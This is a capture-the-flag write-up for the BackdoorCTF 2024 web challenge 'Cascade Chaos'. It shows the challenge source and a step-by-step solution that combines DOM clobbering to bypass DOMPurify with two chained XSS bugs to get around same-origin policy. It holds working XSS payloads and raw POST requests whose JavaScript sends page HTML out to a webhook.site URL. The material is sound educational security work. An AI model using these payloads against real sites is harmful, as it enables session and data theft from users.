@@ -1,0 +1,452 @@
+                         _____________________
+
+                           BACKDOOR CTF 2024
+                          Web - Cascade Chaos
+
+                                Hexdump
+                         _____________________
+
+
+Table of Contents
+_________________
+
+1. Challenge
+.. 1. High level Overview
+.. 2. Remote Service
+.. 3. Local Service
+2. Solution
+.. 1. Brainstorming a Solution
+..... 1. Idea #1
+..... 2. Idea #2
+.. 2. Step 1 - DOM Clobbering
+.. 3. Step 2 - XSS in remote service
+.. 4. Step 3 - XSS in local service
+.. 5. Step 4 - Chaining the XSS for Profit!
+3. References
+
+
+1 Challenge
+===========
+
+1.1 High level Overview
+~~~~~~~~~~~~~~~~~~~~~~~
+
+  File structure
+  ,----
+  | [leo@arch src]$ tree -L 10
+  | .
+  | ├── docker-compose.yaml
+  | ├── local_service
+  | │   ├── app.py
+  | │   ├── Dockerfile
+  | │   └── templates
+  | │       └── flag.html
+  | ├── remote_service
+  | │   ├── Dockerfile
+  | │   ├── package.json
+  | │   ├── package-lock.json
+  | │   └── src
+  | │       ├── bot.js
+  | │       ├── index.js
+  | │       └── views
+  | │           ├── index.ejs
+  | │           └── markdown.ejs
+  | └── start.sh
+  | 
+  | 6 directories, 12 files
+  `----
+
+  Javascript and some python
+  ,----
+  | [leo@arch src]$ cloc .
+  |       12 text files.
+  |       12 unique files.                              
+  |        0 files ignored.
+  | 
+  | github.com/AlDanial/cloc v 2.02  T=0.02 s (618.1 files/s, 164992.6 lines/s)
+  | -------------------------------------------------------------------------------
+  | Language                     files          blank        comment           code
+  | -------------------------------------------------------------------------------
+  | JSON                             2              0              0           2748
+  | EJS                              2             24              1            167
+  | JavaScript                       2             14              0             95
+  | Dockerfile                       2             12              0             43
+  | HTML                             1              0              0             38
+  | YAML                             1              2              0             26
+  | Python                           1              5              0             19
+  | Bourne Shell                     1              3              0              6
+  | -------------------------------------------------------------------------------
+  | SUM:                            12             60              1           3142
+  | -------------------------------------------------------------------------------
+  `----
+
+  docker compose with two services
+  - local service
+  - remote service
+
+  ,----
+  | services:
+  |   local:
+  |     build:
+  |       context: ./local_service
+  |       dockerfile: Dockerfile
+  |     volumes:
+  |       - ./local_service:/app
+  |       - puppeteer-cache:/home/node/.cache/puppeteer
+  |     ports:
+  |       - "4002:4002"
+  |     env_file:
+  |       - .env
+  | 
+  |   remotehost:
+  |     build:
+  |       context: ./remote_service
+  |       dockerfile: Dockerfile
+  |     volumes:
+  |       - ./remote_service:/app
+  |       - /app/node_modules
+  |       - puppeteer-cache:/home/node/.cache/puppeteer
+  |     ports:
+  |       - "4001:4001"
+  |     env_file:
+  |       - .env
+  | 
+  | volumes:
+  |   puppeteer-cache:
+  `----
+
+  Script to start the challenge
+  ,----
+  | #!/bin/bash
+  | 
+  | SECRET_TOKEN=$(head -c 32 /dev/urandom | xxd -p -c 32)
+  | FLAG=flag{dummy_flag}
+  | 
+  | echo "SECRET_TOKEN=$SECRET_TOKEN" > .env
+  | echo "FLAG=$FLAG" >> .env
+  | 
+  | sudo docker-compose up --build
+  `----
+
+
+1.2 Remote Service
+~~~~~~~~~~~~~~~~~~
+
+  Written in nodeJS, three APIs exposed:
+
+  - /
+
+    ,----
+    | app.get('/', async (req, res) => {
+    |     res.render('index', {
+    |         title: "Welcome"
+    |     });
+    | });
+    `----
+
+  - /convert
+
+    ,----
+    | app.get("/convert", (req, res) => {
+    |     let content = req.query.content ? req.query.content : "";
+    |     let heading = req.query.heading ? req.query.heading : "";
+    |     content = converter.makeHtml(content);
+    |     res.render('markdown', {
+    |         title: "Markdown renderer",
+    |         heading: encodeURIComponent(heading),
+    |         body: encodeURIComponent(content)
+    |     });
+    | });
+    `----
+
+  - /visit
+
+    ,----
+    | app.post("/visit", visitLimiter, (req, res) => { 
+    |     try {
+    |         let heading = req.body.heading
+    |         let content = req.body.content
+    |         if (content == undefined) {
+    |             return res.status(200).send("Body is not provided")
+    |         }
+    |         const toReq = `${BASEURL}/convert?heading=${encodeURIComponent(heading)}&content=${encodeURIComponent(content)}`;
+    |         const args = JSON.stringify({ url: toReq, cookie: SECRET_TOKEN });
+    |         childProcess.spawn('node', ['./src/bot.js', args], { stdio: 'inherit' });
+    |         console.log(args)
+    |         return res.status(200).send("Admin will check!")
+    |     } catch (e) {
+    |         return res.status(500).send(e.message)
+    |     }
+    | })
+    `----
+
+  The logic used to make a request to an URL is found in `bot.js'.
+
+
+1.3 Local Service
+~~~~~~~~~~~~~~~~~
+
+  Two APIs exposed
+
+  ,----
+  | from flask import Flask, render_template, request
+  | from flask import abort
+  | import os
+  | from urllib.parse import unquote
+  | 
+  | app = Flask(__name__)
+  | SECRET_TOKEN = os.getenv('SECRET_TOKEN')
+  | 
+  | @app.route('/')
+  | def index():
+  |     return 'Hello, Local World!'
+  | 
+  | @app.route('/flag')
+  | def flag():
+  |     access_token = request.cookies.get('access_token')
+  |     if access_token != SECRET_TOKEN:
+  |         abort(403) 
+  |     color = unquote(request.args.get('color', 'white'))
+  |     flag=os.getenv('FLAG')
+  |     return render_template('flag.html', color=color , flag=flag)
+  | 
+  | if __name__ == '__main__':
+  |     app.run()
+  `----
+
+  Single template `flag.html'
+
+  ,----
+  | <!DOCTYPE html>
+  | <html lang="en">
+  | <head>
+  |     <meta charset="UTF-8">
+  |     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  |     <title>Flag</title>
+  |     <style>
+  |         :root {
+  |         --flag-color: {{ color|safe }};
+  |         }
+  |         body{
+  |             overflow-y:hidden;
+  |             overflow-x: auto;
+  |             white-space: nowrap;
+  |         }
+  |         body{
+  |             background-color: var(--flag-color);
+  |         }
+  |     </style>
+  | </head>
+  | <body>
+  |     <h3>Flag:</h3>
+  |     <div class="flag"></div>
+  | <script>
+  |     // Flag visibility restricted to direct access only for security reasons
+  |     if (window.name === "Flag") { 
+  |         const flagContainer = document.querySelector(".flag");    
+  |         const flagChars = "{{ flag }}".split("");
+  |         // Breaking the flag into pieces, because fragmented flags are harder to steal... right?
+  |         flagChars.forEach(char => {
+  |             const span = document.createElement("span");
+  |             span.textContent = char; 
+  |             flagContainer.appendChild(span);
+  |         });
+  |     }
+  | </script>    
+  | </body>
+  | </html>
+  `----
+
+
+2 Solution
+==========
+
+2.1 Brainstorming a Solution
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  The flag is written within the `flag.html' page in the local
+  service. The challenge allows us to perform an HTTP request with the
+  `bot.js' script.
+
+
+2.1.1 Idea #1
+-------------
+
+  Possible idea
+  ,----
+  | Use an XSS in remote service to force the puppeteer instance to make a request to the local service /flag
+  `----
+
+  Problems:
+
+  1. Obtain the XSS in remote service
+
+  2. SOP (Same-Origin-Policy) does not let us read the response in the
+     html request to /flag.html, since the exploited client will perform
+     a cross origin request.
+
+
+2.1.2 Idea #2
+-------------
+
+  Possible idea
+  ,----
+  | Chain two XSS one after the other.
+  | 
+  | The first XSS is in remote service, and it will be used to force the
+  | puppeteer instance to open a new tab on the local service. This will bypass SOP.
+  | 
+  | The second XSS is in the local service, and it will be used to exilftrate
+  | the flag itself to a controlled URI.
+  `----
+
+
+2.2 Step 1 - DOM Clobbering
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  To actually obtain an XSS within the remote service, we notice in the
+  `markdown.ejs' the following JS code
+
+  ,----
+  | const body = decodeURIComponent(`<%- body -%>`);
+  | const contentDiv = document.querySelector(".content");
+  | if (window.isSafe) {
+  |     contentDiv.innerHTML = body;
+  | } else {
+  |     const sanitizedContent = DOMPurify.sanitize(body);
+  |     contentDiv.innerHTML = sanitizedContent;
+  | }
+  `----
+
+  Notice that the data is sanitized with `DOMPurify' only if the
+  `window.isSafe' property evaluates to false.
+
+  How we can force this?
+
+  We can use the fact that before writing the body parameter into the
+  DOM, we first write the heading into the DOM in the previous js code
+
+  ,----
+  | const heading = decodeURIComponent(`<%- heading -%>`);
+  | const headingDiv = document.querySelector(".heading");
+  | const content = DOMPurify.sanitize(heading);
+  | headingDiv.innerHTML = content;
+  `----
+
+  We can thus use DOM Clobbering techniques to force `window.isSafe' to
+  evaluate to true. This is done by inserting into the header any tag
+  that has an id equal to `isSafe', for example.
+
+  ,----
+  | http://localhost:4001/convert?heading=%3Cp+id%3D%22isSafe%22%3E%3C%2Fp%3E&content=Test
+  `----
+
+
+2.3 Step 2 - XSS in remote service
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  We can then obtain a simple XSS by inserting the malicious JS in the
+  body parameter. Thanks to DOM clobbering, this will not be sanitizied,
+  and will end up in the DOM, forcing the evaluation of the JS code.
+
+  ,----
+  | http://localhost:4001/convert?heading=%3Cp+id%3D%22isSafe%22%3E%3C%2Fp%3E&content=%3Cimg+src%3D%22%22+onerror%3D%22alert%281%29%22%2F%3E
+  `----
+
+  And with this we have an XSS in remote service. To trigger this XSS
+  within the `bot.js' itself, we can send the following HTTP request
+
+  ,----
+  | POST /visit HTTP/1.1
+  | Host: localhost:4001
+  | Content-Length: 150
+  | User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+  | Content-Type: application/json
+  | 
+  | 
+  | {"content":"<p><img src=\"\" onerror=\"fetch('https://webhook.site/dff4c8b7-083a-4de2-a33c-e1b159e049b6')\"></p>","heading":"<p id=\"isSafe\"></p>"}
+  `----
+
+  This will trigger a connection to the website
+  - <https://webhook.site/67604656-6280-4dfc-ae76-cf2acdeb25a8>
+
+
+2.4 Step 3 - XSS in local service
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  To trigger the XSS in the local service. Notice that the `flag.html'
+  template is constructed using the `color' data
+
+  ,----
+  |     <style>
+  |         :root {
+  |         --flag-color: {{ color|safe }};
+  |         }
+  `----
+
+  Which is obtained from the user parameters
+
+  ,----
+  | @app.route('/flag')
+  | def flag():
+  |     access_token = request.cookies.get('access_token')
+  |     if access_token != SECRET_TOKEN:
+  |         abort(403) 
+  |     color = unquote(request.args.get('color', 'white'))
+  |     flag=os.getenv('FLAG')
+  |     return render_template('flag.html', color=color , flag=flag)
+  `----
+
+  ----------------------------------------------------------------------
+
+  The following payload will trigger an XSS
+
+  ,----
+  | http://127.0.0.1:4002/flag?color=black%3C/style%3E%3Cscript%3Ealert(1)%3C/script%3E
+  `----
+
+  Since the flag is found in the HTML file, to extract it we can put a
+  JS payload that will execute as soon as the initial DOM is loaded.
+
+  ,----
+  | window.onload=function(){fetch('https://webhook.site/67604656-6280-4dfc-ae76-cf2acdeb25a8?c='%2Bbtoa(document.documentElement.outerHTML));}
+  `----
+
+  ,----
+  | http://127.0.0.1:4002/flag?color=black%3C/style%3E%3Cscript%3E  %3C/script%3E
+  `----
+
+
+2.5 Step 4 - Chaining the XSS for Profit!
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  To chain the XSS and avoid SOP, the idea is to use `location.href' to
+  open a new tab in the headless chromium instance, instead of
+  performing a `fetch', which has to respect the Same Origin Policy
+  (SOP).
+
+  ,----
+  | <p><img src="x" onerror="location.href='http://local:4002/flag?color=black</style><script>window.onload=function(){location.href=%27https://webhook.site/67604656-6280-4dfc-ae76-cf2acdeb25a8?c=%27%2bbtoa(document.documentElement.outerHTML)}</script>'" ></p>
+  `----
+
+  ,----
+  | POST /visit HTTP/1.1
+  | Host: localhost:4001
+  | Content-Length: 322
+  | User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+  | Content-Type: application/json
+  | 
+  | 
+  | {
+  |   "content": "<p><img src=\"x\" onerror=\"location.href='http://local:4002/flag?color=black</style><script>window.onload=function(){location.href=%27https://webhook.site/67604656-6280-4dfc-ae76-cf2acdeb25a8?c=%27%2bbtoa(document.documentElement.outerHTML)}</script>'\" ></p>",
+  |   "heading": "<p id=\"isSafe\"></p>"
+  | }
+  `----
+
+
+3 References
+============
+
+  - BackdoorCTF: <https://ctftime.org/event/2540/>
+  - Writeup:
+    <https://vicevirus.github.io/posts/backdoor-ctf-2024-writeup/#Cascade%20Chaos>
